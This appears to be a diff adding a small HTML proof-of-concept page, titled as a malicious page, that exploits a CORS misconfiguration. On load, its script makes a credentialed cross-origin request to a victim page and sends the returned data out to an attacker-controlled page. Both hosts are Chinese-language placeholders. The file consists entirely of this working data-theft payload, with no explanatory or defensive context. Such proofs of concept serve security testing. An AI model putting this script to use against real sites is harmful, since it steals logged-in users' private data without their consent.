@@ -1,0 +1,38 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+</head>
+<h1>Hello I malious page. </h1>
+<script type="text/javascript">
+function loadXMLDoc()
+{
+   var xhr1;
+   var xhr2;
+   if(window.XMLHttpRequest)
+   {
+       xhr1 = new XMLHttpRequest();
+       xhr2 = new XMLHttpRequest();
+   }
+   else
+   {
+       xhr1 = new ActiveXObject("Microsoft.XMLHTTP");
+       xhr2= new ActiveXObject("Microsoft.XMLHTTP");
+   }
+   xhr1.onreadystatechange=function()
+   {
+       if(xhr1.readyState == 4 && xhr1.status == 200) //if receive xhr1 response
+       {
+           var datas=xhr1.responseText;
+           xhr2.open("GET","攻击者的黑页","true");
+           xhr2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+           xhr2.send("T1="+escape(datas));      
+       }
+   }
+   xhr1.open("GET","存在CORS的页面","true") //request user page.
+   xhr1.withCredentials = true;        //request with cookie
+   xhr1.send();
+}
+loadXMLDoc();
+</script>
+</html>
